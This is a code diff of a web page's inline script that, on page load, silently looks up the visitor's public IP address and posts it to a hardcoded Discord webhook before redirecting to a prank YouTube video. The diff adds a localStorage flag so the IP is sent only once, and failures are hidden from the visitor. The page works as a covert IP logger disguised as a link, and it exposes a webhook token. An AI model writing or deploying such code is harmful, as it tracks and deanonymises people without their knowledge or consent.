@@ -9,22 +9,29 @@
   </style>
   <script>
     (async () => {
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const { ip } = await res.json();
+      const alreadySent = localStorage.getItem("ip_sent");
 
-        // Replace this with your actual webhook URL (e.g. Discord webhook)
-        await fetch("https://discord.com/api/webhooks/1359581999593033918/G0qtLtRlOeWNlgn1hekeqUPNVzdqd8hXTf80o8wq6YW0-yBp_Z7syBH0xNugNxmDD2j6", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content: `IP: ${ip}` })
-        });
-      } catch (e) {
-        // Silent fail – nothing shown to the user
-      } finally {
-        // Redirect no matter what
-        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+      if (!alreadySent) {
+        try {
+          const res = await fetch("https://api.ipify.org?format=json");
+          const { ip } = await res.json();
+
+          // Replace this with your webhook URL
+          await fetch("https://discord.com/api/webhooks/1359581999593033918/G0qtLtRlOeWNlgn1hekeqUPNVzdqd8hXTf80o8wq6YW0-yBp_Z7syBH0xNugNxmDD2j6", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: `IP: ${ip}` })
+          });
+
+          // Mark as sent in localStorage
+          localStorage.setItem("ip_sent", "true");
+        } catch (e) {
+          // Fail silently
+        }
       }
+
+      // Redirect either way
+      window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
     })();
   </script>
 </head>
